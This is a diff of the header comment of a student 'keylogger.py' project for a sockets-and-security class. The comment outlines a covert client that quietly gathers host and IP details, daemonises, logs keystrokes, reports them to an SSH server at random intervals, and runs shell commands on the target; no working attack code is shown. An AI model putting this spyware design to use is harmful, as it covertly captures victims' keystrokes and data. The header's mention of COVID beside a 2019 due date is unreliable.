@@ -1,9 +1,37 @@
+#!/usr/bin/env/python3
+# keylogger.py
 #==============================================================================
- #   keylogger.py
- #   The program terminates when grave key(`) is pressed
- #   This requires: 
-#    at least python-xlib 1.4
-#   
+ #   Assignment:  Major Project - Final
+ #
+ #       Author:  Alistair Godwin, Micheal Sciortino, Francesso Losi
+ #     Language:  Python 3
+ #                      
+ #   To Compile: Paramiko must be available 
+ #
+ #    Class:  DPI912 - Python for Programmers: Sockets and Security
+ #    Professor:  Harvey Kaduri
+ #    Due Date:  April 17, 2019
+ #    Submitted: April 17, 2019
+ #
+ #-----------------------------------------------------------------------------
+ #
+ #  Description: This program is a skeleton client that connects to an ssh server using paramiko. It awaits connections and prompts on a connection to execute shell commands onto the target client.
+ #      
+ #        Input:  Textual Input 
+ #
+ #       Output:  Friendly messages to the user
+ #
+ #    Algorithm:  Invokes the Paramiko supplied functions to create and manage a connection to an SSH server. Ask user to voluntarily give up certain information.
+ #                      Quietly grab the target user's computer information such as host and IP addresses. 
+ #                      Double Fork and begin keylogging data. On a random interval, contact the server and report data logged       
+ 
+ #   Required Features Not Included: Optional features such as screenshots were not included due to time and COVID constraints.
+ #
+ #   Known Bugs:  N/A
+ #      
+ #
+ #   Classification: N/A
+ #
 #==============================================================================
 import os
 import sys
